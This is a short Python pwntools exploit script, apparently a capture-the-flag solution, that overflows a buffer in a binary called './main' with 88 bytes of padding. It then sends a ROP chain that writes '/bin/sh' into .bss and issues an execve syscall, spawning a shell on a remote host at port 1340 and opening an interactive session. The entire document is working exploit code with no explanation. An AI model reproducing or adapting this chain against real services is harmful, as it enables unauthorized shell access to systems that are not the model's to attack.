from pwn import *



elf =context.binary =ELF('./main')

context.log_level='error'

offset =88

poprdi =0x0000000000401fd0 #poprdi
poprsi =0x000000000040aa38 #poprsi
syscall =0x000000000040119e #syscall
poprdx =0x000000000045d7a7 # pop rdx ; pop rbx ; ret
poprax =0x000000000041706c # pop rax ; ret
popraxrbxrdx=0x000000000045d7a6 #: pop rax ; pop rdx ; pop rbx ; ret
gets= 0x416e80
ret=0x0000000000474613
bss =elf.bss()
mov =0x0000000000418291 #: mov qword ptr [rsi], rax ; ret





#p=process()
p =remote('13.36.165.255' ,1340)
pay =flat(
	b'a'*offset,
	poprsi,
	bss,
	poprax,
	b'/bin/sh\x00',
	mov,
    	poprax, 0x3b,
    	poprsi, 0,
    	poprdi, bss,
    	poprdx, 0,0,
    	syscall
	
	)

p.sendline(pay)

write('pay',pay)



p.interactive()


